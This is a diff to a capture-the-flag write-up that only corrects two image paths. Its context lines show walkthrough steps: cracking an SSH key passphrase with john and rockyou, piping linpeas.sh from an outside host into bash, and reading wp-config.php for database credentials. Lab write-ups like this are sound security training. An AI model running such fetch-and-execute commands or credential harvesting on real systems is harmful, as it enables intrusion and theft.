@@ -204,7 +204,7 @@ Then we can try to crack using *john*:
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash 
 ```
 
-![Cracked SSH key passphrase](/assets/ctf/hs/easy/ascension/2.png)
+![Cracked SSH key passphrase](/assets/img/ctf/hs/easy/ascension/2.png)
 
 Passphrase cracked!
 
@@ -314,7 +314,7 @@ user1@ip-10-1-39-71:~$ curl http://10.200.18.143:8000/lin/linpeas.sh | bash
 user1@ip-10-1-39-71:~$ cat /var/www/html/wp-config.php
 ```
 
-![Wordpress config](/assets/img/ctf/hs/easy/ascension/4.pmg)
+![Wordpress config](/assets/img/ctf/hs/easy/ascension/4.png)
 
 *wpuser:wppassword* at *localhost*
 
